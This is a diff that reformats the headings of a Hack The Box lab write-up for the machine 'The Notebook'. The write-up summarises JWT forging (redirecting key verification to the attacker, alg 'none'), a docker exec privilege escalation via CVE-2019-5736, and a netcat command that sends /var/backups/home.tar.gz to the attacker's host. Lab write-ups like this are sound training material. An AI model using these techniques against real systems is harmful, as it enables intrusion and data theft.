@@ -1,17 +1,17 @@
-# H1 Hack The Box Guide by Alen Peric:
-# H2 The Notebook
-# H3 IP: 10.10.10.230
+# Hack The Box Guide by Alen Peric:
+## The Notebook
+### IP: 10.10.10.230
 
-# H3 Summary: 
+### Summary: 
 
 The Notebook introduces us to jwt token manipulation. Lots of interesting lessons on base64 encoding/decoding, constructing cookies and manipulating them. Great insight into transferring files using netcat. This machine also shows us how to manipulate the docker exec environment for privilege escalation. Touches on “go” and “tar” files, as well as ssh private keys for verification.
 
-# H3 CVE References:
+### CVE References:
 - CVE-2019-5736 
 
 **-------------------------------------------------------------------------------------------------------------------------------**
 
-# H3 Important Commands:
+### Important Commands:
 *ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
 openssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub
 nc -N 10.10.16.160 1717 < /var/backups/home.tar.gz
@@ -23,7 +23,7 @@ go build main.go*
 
 **-------------------------------------------------------------------------------------------------------------------------------**
 
-# H3 Notes:
+### Notes:
 
 Starting with enumeration, we observe that port 22 (SSH) and port 80 (HTTP) are open. There was also port 10010 open with rxapi, however that is a rabbid hole. Start your burpsuite, turn packet intercepts off and let’s head to the website. There is a small webapp running on there, where we are able to create an account and post notes to a website. After some experimenting trying to inject SQL and reverse shells to the website, we observe that there is a token that gets passed through the packet whenever we refresh the page. The cookie token looks like this:
 
@@ -54,7 +54,7 @@ This should result in producing a compiled file called just main. Start a mini h
 
 **-------------------------------------------------------------------------------------------------------------------------------**
 
-# H3 Lessons:
+### Lessons:
 
 Amazing learns about JWT token manipulation. Aside from being able to redirect the verification process to our local machine and sign with our own private key. The alternative is the ability to change the JWT token’s alg field to none, which omits the need for a signature in the cookie. Lots of great information in here: https://cyberpolygon.com/materials/security-of-json-web-tokens-jwt/ as well as the actual website for decrypting JWT tokens can be found here: https://jwt.io/ 
 Additionally, here is a great website to convert base64 and encode it: https://www.base64encode.org/ also there seems to be a brute-forcing tool for jwt tokens on github here: https://github.com/ticarpi/jwt_tool/ 
